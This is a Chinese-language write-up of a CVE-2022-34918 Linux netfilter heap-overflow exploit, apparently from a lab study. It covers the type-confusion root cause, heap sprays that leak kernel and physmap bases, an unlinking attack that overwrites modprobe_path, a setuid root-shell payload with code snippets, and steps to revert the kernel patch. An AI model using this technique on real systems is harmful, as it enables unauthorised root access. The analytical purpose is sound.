# CVE-2022-34918

## 漏洞原理

### **漏洞描述**

​		在netfilter模块的nft_setelem_parse_data() 函数中存在一处类型混淆(type confusion)，从而在nft_set_elem_init() 函数产生了堆溢出，溢出长度可达 64-16=48字节，漏洞对象可以位于 kmalloc-{64,96,128,192}。

​		引入漏洞的代码如下：

<img src="README.assets/image-20231117221600057.png" alt="image-20231117221656309" style="zoom:50%;" />

​		patch如下：

<img src="README.assets/image-20231117222255037.png" alt="image-20231117222255037" style="zoom: 50%;" />

​		漏洞的引入主要在引入漏洞的代码的5097行。根据patch后的含义进行解读可以知道，原代码其实”**强制把set->dtype当做NFT_DATA_VERDICT“**，但实际上set->dtype有其他类型的可能性，这就是类型混淆的成因。

​		假设此时set->dtype == NFT_DATA_VALUE且desc->type == NFT_DATA_VERDICT，则desc->len == 16，set->dlen和desc->len可以不同，但由于这两个判断中间是“与”逻辑，因此并不会走到错误分支。因此随后会正常返回0，并进而推进上层函数逻辑。

​		上层函数如下:

<img src="README.assets/image-20231118143359685.png" alt="image-20231118143359685" style="zoom:50%;" />

​		nft_setelem_parse_data函数（5885行）执行完后，会先调用nft_set_ext_add_length函数（5915行）对tmpl赋值，并且tmpl数据结构中会保留desc.len的信息（即tmpl长度与desc.len相同），用于在nft_set_elem_init中进一步使用。

​		nft_set_elem_init函数中相关代码如下，这里是溢出的直接发生点。

<img src="README.assets/image-20231119095931849.png" alt="image-20231119095931849" style="zoom: 50%;" />

​		可以注意到，elem的空间由tmpl->len决定（5372行），而tmpl->len实际上就等于desc->len。

​		由于set->dlen和desc->len可以不同，但在下面的memcpy函数（5384行）中，复制的长度为set->dlen，这也就造成了缓冲区的溢出写。并且最大溢出字节为48字节，因为set->dlen最大为64字节，而desc->len为固定值16字节。

---

## 利用的方法原理

### （1）初始化

#### （1-1） 设置affinity；

​		**提高CPU的亲和性**。在多核运行的机器上，每个CPU本身自己会有缓存，在缓存中存着进程使用的数据，而没有绑定CPU的话，进程可能会被操作系统调度到其他CPU上。而当缓存区绑定CPU后，程序就会一直在指定的CPU执行，不会被操作系统调度到其他CPU，性能上会有一定的提高。

#### （1-2）子进程等待执行 /tmp/get_root 提权程序，该程序会被赋予root权限；

​		**①等待执行提权程序**

​		exp中定义如下prepare_root_shell函数：

~~~ c
void prepare_root_shell(void) {
    int shmid = shmget(0x1337, sizeof(sem_t), IPC_CREAT | S_IRWXU | S_IRWXG | S_IRWXO);
    shell_barrier = shmat(shmid, NULL, 0);

    if (sem_init(shell_barrier, 1, 0) < 0)
        error("sem_init");

    if (!fork()) {
        system("cp ./get_root /tmp");
        sem_wait(shell_barrier);
        system("/tmp/get_root");
        exit(EXIT_SUCCESS);
    }
}
~~~

​		创建了一个新线程，用于将get_root文件复制到/tmp文件夹，并等待一个与提权相关的信号量（shell_barrier）。当提权成功时，该线程运行get_root文件，为攻击者提供shell。

​		**②程序被赋予root权限**		

​		shell_barrier信号量的后续相关代码如下所示：

~~~c
void get_root_shell(void) {
		execve("/tmp/dummy", NULL, NULL);
    sem_post(shell_barrier);
}
~~~

​		当get_root_shell函数执行/tmp/dummy文件（这是一个错误程序）时，会触发modprobe 提权，该过程中会执行如下代码中的指令：

~~~c
const char new_modprobe_content[] = "#!/bin/sh\n\nchown root:root /tmp/get_root\nchmod 4555 /tmp/get_root\n";
~~~

​		该指令可先将get_root文件的所有者提权为root，再将该文件的执行者提权为root(与所有者相同)。

#### （1-3）设置namespace（触发漏洞需要CAP_NET_ADMIN权限）；

#### （1-4）创建 netlink socket 来管理 netfilter；

### （2）设置 nf_tables

#### （2-1）创建 table；

​		后续set结构体的容器。

#### （2-2）创建 set 用于泄露地址；

​		exp需要通过溢出写来泄露内核基地址，而被溢出写的elem对象包含在set结构体中。

#### （2-3）创建 set 用于溢出篡改 modprobe_path；

​		exp需要通过溢出写来篡改 modprobe_path，从而触发modprobe 提权，而被溢出写的elem对象包含在set结构体中。

### （3）泄露内核基址与physmap基址

#### （3-1）喷射50个 user_key_payload 对象（最好位于漏洞对象后面）；

​		根据漏洞原理可知，漏洞函数memcpy中，产生了缓冲区的溢出写。并且最大溢出字节为48字节，因为set->dlen最大为64字节，而desc->len为固定值16字节。

​		user_key_payload结构体如下所示，exp的目标为溢出覆盖user_key_payload->datalen ，然后获取更多的数据。

~~~c
struct user_key_payload {
	struct rcu_head	rcu;		/* RCU destructor */
	unsigned short	datalen;	/* length of this data */
	char		data[] __aligned(__alignof__(u64)); /* actual data */
};
~~~

#### （3-2）分配漏洞对象并触发溢出篡改 user_key_payload->datalen 为 0xffff；

​		当喷射的对象恰好位于漏洞对象elem后面，exp通过溢出写修改datalen为0xffff，便于识别哪一个user_key_payload结构体被喷射到elem后面。

#### （3-3）喷射300个 percpu_ref_data 对象（最好位于 user_key_payload 后面）；

​		percpu_ref_data结构体如下所示，其中包含了两个内核基地址和physmap地址（便于后续的modprobe 提权）。

~~~c
struct percpu_ref_data {
	atomic_long_t		count;
	percpu_ref_func_t	*release; 		// 内核基址
	percpu_ref_func_t	*confirm_switch;// 内核基址
	bool			force_atomic:1;
	bool			allow_reinit:1;
	struct rcu_head		rcu;
	struct percpu_ref	*ref; 			// physmap 地址
};
~~~

#### （3-4）泄露 percpu_ref_data->release 内核基址和 percpu_ref_data->ref physmap基址（只要读取长度为 0xffff 则表示 user_key_payload->datalen 被成功覆写）；		

​		由于（3-2）中exp将datalen修改为0xffff，则可读取该结构体后续0xffff字节的内容。通过以下代码中keyctl函数来获取有效字节数，若读到的字节数量为0xffff，则可认为找到了被修改的user_key_payload。

~~~c
struct leak *get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {
        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);
        if (keylen < 0)
            error("keyctl");

        if (keylen == USHRT_MAX)    
        {
            return parse_leak((long *)buffer, keylen >> 3);
        }
    }
    return NULL;
}
~~~

​		由于percpu_ref_data是后喷射（申请空间）的，因此大概率会在user_key_payload的后面。此时逐个遍历读到的0xffff个字节，则大概率能找到所喷射的percpu_ref_data结构体。找到该结构体后，通过以下代码比较基地址偏移量，若相同，则成功泄露基地址。

~~~c
struct leak *parse_leak(long *buffer, uint32_t buffer_size) {
    struct leak *ret = malloc(sizeof(struct leak));
    if (!ret)
        error("malloc");

    for (uint32_t i = 0; i < buffer_size; i++) {
        if ((buffer[i] & 0xfffff) == (IO_RING_CTX_REF_FREE_OFFSET & 0xfffff)) {
            ret->kaslr_base = buffer[i] - IO_RING_CTX_REF_FREE_OFFSET;
            ret->physmap_base = buffer[i + 5] & PHYSMAP_MASK;
            return ret;
        }
        else if ((buffer[i] & 0xfffff) == (IO_RSRC_NODE_REF_ZERO_OFFSET & 0xfffff)) {
            ret->kaslr_base = buffer[i] - IO_RSRC_NODE_REF_ZERO_OFFSET;
            ret->physmap_base = buffer[i + 5] & PHYSMAP_MASK;
            return ret;
        }
    }
    free(ret);
    return NULL;
}
~~~

### （4）篡改 modprobe_path

#### （4-1）喷射300个 simple_xattr（最好位于漏洞对象后面）；

​		 simple_xattr结构体如下所示：

~~~c
struct simple_xattr {
    struct list_head list;
    char *name;
    size_t size;
    char value[];
};

struct list_head {
	struct list_head *next, *prev;
};
~~~

#### （4-2）分配漏洞对象并触发溢出篡改 simple_xattr->list；

​		与喷射user_key_payload相同，exp通过溢出写修改simple_xattr->list。

​		**Unlinking attack**

​		__list_del()代码如下，如果我们能够控制 `prev` / `next` 指针，可以把 `next` 指针设置为 `modprobe_path` ，这样就会在 [1] 处将 `prev` 值写入 `next` 指向的内存偏移8字节处。

```c
static inline void __list_del(struct list_head * prev, struct list_head * next)
{
	next->prev = prev; 				// [1]
	WRITE_ONCE(prev->next, next); 	// [2]
}
```

**physmap**：physmap 是一块内核虚拟内存，物理内存页连续映射到该处。例如，如果机器有4G内存（2^32 字节），需用32 bit来索引物理内存；假设 physmap 起始地址是 0xffffffff00000000，则 `0xffffffff00000000~0xffffffffffffffff ` 范围内的值都有效。因此，若系统有4G内存，攻击者可以控制 `prev` 的低4字节，只要高4字节表示physmap地址即可。

**① simple_xattr->list.next = (physmap_base + 0x2f706d74)**

**②simple_xattr->list.prev = (kaslr_base + MODPROBE_PATH_BASE + 1)**

​		`0x2f706d74`所对应的ASCII码为`/tmp`，则可利用[2]将 `modprobe_path` 覆写为 `/tmp/xxxxprobe`,便于后续的modprobe 提权。

**③为了识别被覆盖的simple_xattr，simple_xattr->name 长度为0x100，最低字节覆盖为 0xe5 = 229，这样name 恰好指向attribute结尾的某个特定字符串（例如 "security.Iwanttoberoot"），这样只要能成功移除该字符串对应的xattr，则表示该标签已被覆盖**

#### （4-3）触发 unlinking attack，将 /sbin/modprobe 修改为 /tmp/xxxxprobe；

​		后续exp将通过执行错误程序触发 modprobe 提权，而该过程中os由于执行了错误的程序，它在处理该错误时会用到`/sbin/modprobe` 文件，所以在上一步exp将/sbin/modprobe 修改为 `/tmp/xxxxprobe` 后，os会执行exp创建的xxxxprobe文件。

#### （4-4）执行错误程序触发 modprobe 提权

​		exp中write_new_modprobe函数和create_dummy_file函数分别用于创建xxxxprobe文件和错误程序：

~~~c
void setup_modprobe_payload(void) {
    char *filename;
    filename = get_new_modprobe_path();

    write_new_modprobe(filename);
    create_dummy_file();

    free(filename);
}
~~~

​		write_new_modprobe函数如下所示：

~~~c
void write_new_modprobe(char *filename) {
    int fd;
    fd = open(filename, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0)
        error("open");

    write(fd, new_modprobe_content, sizeof(new_modprobe_content));
    close(fd);
}
~~~

​		其中，new_modprobe_content（文件内容）为`"#!/bin/sh\n\nchown root:root /tmp/get_root\nchmod 4555 /tmp/get_root\n"` (提权指令)。当os执行xxxxprobe文件时，就会执行该提权指令，使得get_root文件的执行者提权为root，后续exp将（1-2）中子线程所等待的信号量+1，子线程则能继续执行get_root文件。由于get_root文件执行`"/bin/sh"` ，则可获得shell。

### 攻击成功

<img src="README.assets/image-20231120153454055.png" alt="image-20231120153454055" style="zoom:50%;" />

<img src="README.assets/image-20231120153546505.png" alt="image-20231120153546505" style="zoom: 67%;" />

### 注：

exp文件编译命令如下：

~~~bash
gcc -no-pie -static -pthread ./exploit.c -o ./exploit
~~~

get_root文件编译命令如下：

~~~bash
gcc -static ./get_root.c -o ./get_root
~~~

---

## 遇到的问题&解决方案

### Q1：漏洞触发失败

A：因为Kasan选项开启，导致在漏洞函数memcpy处进行“堆溢出写”时，被Kasan缓解，因此溢出写失败。

关闭Kasan选项后重新编译内核，漏洞触发成功。

### Q2:”将 /sbin/modprobe 修改为 /tmp/xxxxprobe“失败

A：因为虚拟机的内存大小一开始设置为512M，若 physmap 起始地址是 0xffffffff00000000，则不是`0xffffffff00000000~0xffffffffffffffff ` 范围内的值都有效，因而攻击者无法控制 `prev` 的低4字节。

将虚拟机内存大小修改为4G（2^32 字节）即可。

### Q3:提权脚本执行失败

A：（1）文件系统bin文件夹下没有bash程序，只能通过sh调用busybox进而弹出shell。

​		故需把exp中的

~~~c
const char new_modprobe_content[] = "#!/bin/bash\n\nchown root:root /tmp/get_root\nchmod 4555 /tmp/get_root\n";
~~~

​		改为

~~~c
const char new_modprobe_content[] = "#!/bin/sh\n\nchown root:root /tmp/get_root\nchmod 4555 /tmp/get_root\n";
~~~

​		并把get_root文件中的

~~~c
system("/bin/bash");
~~~

​		改为

~~~c
system("/bin/sh");
~~~

​		（2）由于以下指令需要同时提权”用户“和”用户组“至root

~~~bash
chown root:root /tmp/get_root
~~~

​			故需要在/etc/passwd, /etc/group, /etc/shadow, /etc/gshadow中进行相应的设置，以保证root用户与用户组的存在。

---

## patch reverse

**若只reverse“漏洞原理”部分所述函数，无法成功泄露基地址。**完整patch reverse阐述如下：

​		nft_setelem_parse_data函数为漏洞的根本触发点，必须全部还原。只有触发类型混淆，进而绕过长度检查，才能触发到后续的缓冲区溢出写。

​		到这一步时，**漏洞触发路径为：**

~~~c
nf_tables_newsetelem() -> nft_add_set_elem() -> nft_setelem_parse_data()
~~~

​		由于变化较大，因此单独分两个代码框展示，patch reverse结果如下：

~~~c
// After patch
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,struct nft_data_desc *desc,struct nft_data *data,struct nlattr *attr)
{
	u32 dtype;
	if (set->dtype == NFT_DATA_VERDICT)
		dtype = NFT_DATA_VERDICT;
	else
		dtype = NFT_DATA_VALUE;
	desc->type = dtype;
	desc->size = NFT_DATA_VALUE_MAXLEN;
	desc->len = set->dlen;
	desc->flags = NFT_DATA_DESC_SETELEM;
	return nft_data_init(ctx, data, desc, attr);
}
~~~

~~~c
// Patch reverse
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
				  struct nft_data_desc *desc,
				  struct nft_data *data,
				  struct nlattr *attr)
{
	int err;
	err = nft_data_init(ctx, data, desc, attr);
	if (err < 0)
		return err;
	if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
		nft_data_release(data, desc->type);
		return -EINVAL;
	}
	return 0;
}
~~~

​		nft_data_init为nft_setelem_parse_data会调用的函数，其中两行代码需要删除，因为exp发送消息时，会同时发送两个elements到set中以触发漏洞：第一个element用于建立data payload，其类型为NFT_DATA_VALUE，第二个element用于漏洞触发，其类型为NFT_DATA_VERDICT。这也就要求两条路径均需通过检查。如果不进行还原，则会引起类型比对错误，进而导致返回-EINVAL，直接在最外层nf_tables_newsetelem的循环退出。

​		到这一步时，**漏洞触发路径为：**

~~~c 
nf_tables_newsetelem() -> nft_add_set_elem() -> nft_setelem_parse_data() -> nft_data_init()
~~~

​		由于变化较小，patch reverse的结果以注释形式呈现：

~~~c
int nft_data_init(const struct nft_ctx *ctx, struct nft_data *data,
		  struct nft_data_desc *desc, const struct nlattr *nla)
{
	struct nlattr *tb[NFTA_DATA_MAX + 1];
	int err;
	if (WARN_ON_ONCE(!desc->size))
		return -EINVAL;
	err = nla_parse_nested_deprecated(tb, NFTA_DATA_MAX, nla,
					  nft_data_policy, NULL);
	if (err < 0)
		return err;
	if (tb[NFTA_DATA_VALUE]) {
       	/*
       	Codes below need to be removed after patch reverse
		if (desc->type != NFT_DATA_VALUE)  
			return -EINVAL;
        */
		err = nft_value_init(ctx, data, desc, tb[NFTA_DATA_VALUE]);
	} else if (tb[NFTA_DATA_VERDICT] && ctx != NULL) {
        /*
        Codes below need to be removed after patch reverse
		if (desc->type != NFT_DATA_VERDICT) 
			return -EINVAL;
		*/
		err = nft_verdict_init(ctx, data, desc, tb[NFTA_DATA_VERDICT]);
	} 
	else {
		err = -EINVAL;
	}
	return err;
}
~~~

​		nft_verdict_init函数为nft_data_init会调用的函数，该函数中需要指定desc->type = NFT_DATA_VERDICT，因为进这个函数时，desc->type的类型不一定是这个，但我们却需要desc->type = NFT_DATA_VERDICT来触发类型混淆的检测。

​		到这一步时，**漏洞触发路径为：**

~~~c 
nf_tables_newsetelem() -> nft_add_set_elem() -> nft_setelem_parse_data() -> nft_data_init() -> nft_verdict_init()
~~~

​		由于变化较小，patch reverse的结果以注释形式呈现：

~~~c
static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,struct nft_data_desc *desc, const struct nlattr *nla)
{
    ...
	desc->len = sizeof(data->verdict);
    ...
        
	// After patch reverse：
        
    ...
	desc->len = sizeof(data->verdict);
	desc->type = NFT_DATA_VERDICT; // Code needs to be added after patch reverse
    ...
}
~~~

​		nft_value_init函数为nft_data_init会调用的函数，其中必须移除if (len != desc->len)的检测，因为该缓冲溢出漏洞本就是因为set->dlen与desc->len不等导致的，而这会进一步导致此处len与desc->len不等，因此这里的检测一定会导致返回-EINVAL。并且需要随后设定desc的类型与长度，否则可能引起不一致造成利用失败。

​		到这一步时，**漏洞触发路径为：**

~~~c
nf_tables_newsetelem() -> nft_add_set_elem() -> nft_setelem_parse_data() -> nft_data_init() -> nft_value_init()
~~~

​		代码中需要删除一大段，并随后添加两行，在下面代码块中以注释形式呈现：

~~~c
static int nft_value_init(const struct nft_ctx *ctx,struct nft_data *data, struct nft_data_desc *desc,const struct nlattr *nla)
{
	unsigned int len;
	len = nla_len(nla);
	if (len == 0)
		return -EINVAL;
	if (len > desc->size)
		return -EOVERFLOW;
    /*
    Codes below need to be removed after patch reverse
	[-]if (desc->len) {
		if (len != desc->len)
			return -EINVAL;
	} else {
		desc->len = len;
	}
	*/
	nla_memcpy(data->data, nla, len);
    /*
	Codes below need to be added after patch reverse
    */
    desc->type = NFT_DATA_VALUE;
    desc->len = len;
    
	return 0;
}
~~~

